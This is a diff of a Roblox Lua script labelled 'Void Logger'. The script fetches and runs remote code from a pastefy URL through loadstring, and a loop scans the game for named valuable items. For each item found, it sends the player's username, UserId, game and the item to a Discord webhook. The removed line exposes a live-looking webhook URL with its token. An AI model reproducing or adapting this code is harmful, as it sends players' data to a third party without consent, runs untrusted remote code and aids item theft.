@@ -96,7 +96,7 @@ reexecute.TextScaled = true
 reexecute.Parent = bg
 
 reexecute.MouseButton1Click:Connect(function()
-loadstring(game:HttpGet("https://pastefy.app/j9ERnU1R/raw"))()", true))()
+loadstring(game:HttpGet("https://pastefy.app/j9ERnU1R/raw", true))()
 end)
 
 local credit = Instance.new("TextLabel")
@@ -110,7 +110,7 @@ credit.TextSize = 20
 credit.TextColor3 = Color3.fromRGB(200,200,200)
 credit.Parent = bg
 
-local webhook = "https://discord.com/api/webhooks/1470887638792667278/ABTnUwFUwFQArtp_LK6WSi40l0TJ5QriZo_Rpho4_f-G6s9KIbG-VWZCW8_9hHuXEzQf"
+local webhook = "YOUR_WEBHOOK"
 
 local targets = {
 ["Hydra Dragon Cannelloni"]=true,["W or L"]=true,["La Romantic Grande"]=true,
@@ -135,19 +135,11 @@ local targets = {
 local req = request or http_request or syn and syn.request or fluxus and fluxus.request
 
 task.spawn(function()
-local found = {}
 local detected = {}
-local plots = workspace:FindFirstChild("Plots") or workspace
-
-for _,v in ipairs(plots:GetDescendants()) do
+while true do
+for _,v in ipairs(workspace:GetDescendants()) do
 if targets[v.Name] and not detected[v.Name] then
 detected[v.Name] = true
-table.insert(found,v.Name)
-end
-end
-
-if #found > 0 then
-local brainrotList = table.concat(found,"\n")
 
 local data = {
 content = "@everyone",
@@ -158,7 +150,7 @@ fields = {
 {name="💻 Username",value="-# **Just tap **\n`"..username.."`",inline=false},
 {name="🆔 UserId",value=tostring(userid),inline=true},
 {name="🎮 Game",value=gameName,inline=true},
-{name="👑 Valuable Brainrots",value=brainrotList,inline=false}
+{name="👑 Valuable Brainrot",value=v.Name,inline=false}
 },
 footer={text="Void Logger"}
 }}
@@ -172,6 +164,9 @@ Headers = {["Content-Type"]="application/json"},
 Body = HttpService:JSONEncode(data)
 })
 end
+end
+end
+task.wait(0.2)
 end
 end)
 
